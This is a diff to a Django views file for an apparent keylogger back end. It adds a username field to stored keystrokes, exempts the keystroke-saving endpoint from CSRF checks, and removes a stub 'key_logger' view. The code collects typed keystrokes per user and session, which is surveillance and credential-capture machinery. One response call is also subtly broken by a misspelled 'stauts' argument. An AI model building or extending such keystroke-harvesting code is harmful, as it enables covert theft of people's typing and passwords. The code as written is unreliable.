@@ -4,6 +4,7 @@ from django.http import JsonResponse
 from django.views.decorators.csrf import csrf_exempt
 import uuid
 
+
 from .models import Keystroke
 # Create your views here.
 
@@ -15,10 +16,8 @@ def generate_session_id():
     """
     return uuid.uuid4().hex
 
-def key_logger(request):
-    print(request.headers)
-    return HttpResponse("KeyLogger")
 
+@csrf_exempt
 def save_keystroke(request):
     """
     A view function to receive and save keystrokes sent via a POST request.
@@ -39,18 +38,20 @@ def save_keystroke(request):
                     # Create and save a new Keystroke object
                     Keystroke.objects.create(
                         keystroke=keystroke,
-                        session_id=session_id
+                        session_id=session_id,
+                        username = username
                     )
                     return JsonResponse({'status': 'success', 'message': 'Keystroke saved successfully.','session_id':session_id},status=201)
                 else:
-                    return JsonResponse({})
+                    return JsonResponse({'session_id':session_id},stauts=201)
                     
             # Ensure both keystroke and session_id are present
-            if keystroke and session_id:
+            if keystroke and session_id and username:
                 # Create and save a new Keystroke object
                 Keystroke.objects.create(
                     keystroke=keystroke,
-                    session_id=session_id
+                    session_id=session_id,
+                    username=username
                 )
                 return JsonResponse({'status': 'success', 'message': 'Keystroke saved successfully.'},status=200)
             else:
